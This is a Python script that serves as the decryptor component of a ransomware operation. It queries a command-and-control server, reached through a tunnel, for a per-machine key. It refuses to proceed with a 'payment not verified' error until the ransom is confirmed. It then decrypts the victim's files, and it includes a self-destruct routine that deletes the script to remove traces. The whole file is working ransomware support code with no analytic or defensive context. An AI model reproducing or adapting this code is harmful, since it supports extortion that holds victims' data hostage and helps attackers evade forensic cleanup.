import os, argparse, requests, urllib3, time
from pathlib import Path
from cryptography.fernet import Fernet

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DecryptionEngine:
    def __init__(self, server_url, machine_id, target_dir):
        self.server_url = server_url.rstrip('/')
        self.machine_id = machine_id
        self.target_dir = Path(target_dir).resolve()
        self.key = None
        
        self.bypass_headers = {
            "localtonet-skip-warning": "true",
            "Content-Type": "application/json",
            "User-Agent": "SecureDecrypter/1.0"
        }

    def fetch_key(self):
        print(f"[*] Contacting C2 Server for Machine ID: {self.machine_id}...")
        
        try:
            response = requests.get(
                f"{self.server_url}/get_key", 
                params={"machine_id": self.machine_id}, 
                headers=self.bypass_headers,
                verify=False, 
                timeout=20
            )
            
            content_type = response.headers.get('Content-Type', '')
            if "application/json" not in content_type:
                print("[!] Error: Received non-JSON response. The tunnel might be showing a warning page.")
                print(f"[*] Response Preview: {response.text[:100]}...")
                return False

            if response.status_code == 200:
                data = response.json()
                if 'key' in data:
                    self.key = data['key'].encode('utf-8')
                    print("[+] Key retrieved successfully from C2.")
                    return True
                else:
                    print(f"[!] Error: Key missing in server response: {data}")
                    return False
            
            elif response.status_code == 403:
                print("[!] Error: Payment not verified (403). Please contact support.")
            elif response.status_code == 404:
                print("[!] Error: Machine ID not found on server (404).")
            else:
                print(f"[!] Server returned unexpected error: {response.status_code}")
                print(f"[*] Response Body: {response.text}")

        except requests.exceptions.SSLError:
            print("[!] SSL Error: Certificate verification failed.")
        except requests.exceptions.ConnectionError:
            print("[!] Connection Error: Could not reach the C2 server. Check your internet/tunnel.")
        except requests.exceptions.Timeout:
            print("[!] Timeout Error: The server took too long to respond.")
        except Exception as e:
            print(f"[!] An unexpected error occurred: {type(e).__name__} - {e}")
        
        return False

    def decrypt_file(self, file_path, fernet):
        try:
            temp_file = file_path.with_suffix(file_path.suffix + ".dec_tmp")
            with open(file_path, "rb") as rf:
                encrypted_content = rf.read()

            decrypted_content = fernet.decrypt(encrypted_content)
            with open(temp_file, "wb") as wf:
                wf.write(decrypted_content)

            os.replace(temp_file, file_path)
            print(f"[+] Restored: {file_path.name}")
            
        except Exception as e:
            print(f"[-] Failed to decrypt {file_path.name}: {e}")
            if os.path.exists(temp_file):
                os.remove(temp_file)

    def start_decryption(self):
        if not self.fetch_key():
            print("[!] Decryption process aborted due to key retrieval failure.")
            return

        try:
            fernet = Fernet(self.key)
        except Exception as e:
            print(f"[!] Invalid Key Format: {e}")
            return

        print(f"[*] Starting decryption in: {self.target_dir}")

        files_to_process = []
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                if file.endswith(".tmp") or file.endswith(".dec_tmp"):
                    continue
                files_to_process.append(Path(root) / file)

        if not files_to_process:
            print("[!] No files found to decrypt in the target directory.")
            return

        print(f"[*] Found {len(files_to_process)} files. Beginning restoration...")

        for file_path in files_to_process:
            self.decrypt_file(file_path, fernet)

        print("\n[🕱] Decryption process complete. All files have been restored.")
        # self.self_destruct()

    def self_destruct(self):
        print("[*] Cleaning up traces...")
        time.sleep(2)
        try:
            script_path = Path(__file__).resolve()
            os.remove(script_path)
        except Exception as e:
            print(f"[!] Cleanup failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="Secure Decryption Utility")
    parser.add_argument("--server", required=True, help="The C2 Server URL (e.g., https://your-tunnel.com)")
    parser.add_argument("--id", required=True, help="The Machine ID used during encryption")
    parser.add_argument("--path", required=True, help="The directory containing the encrypted files")
    
    args = parser.parse_args()

    print("\n")
    print(f"[*] Target Directory: {args.path}")
    print(f"[*] Machine ID:       {args.id}")
    print(f"[*] C2 Server:        {args.server}")
    print("\n")

    engine = DecryptionEngine(args.server, args.id, args.path)
    engine.start_decryption()

if __name__ == "__main__":
    main()

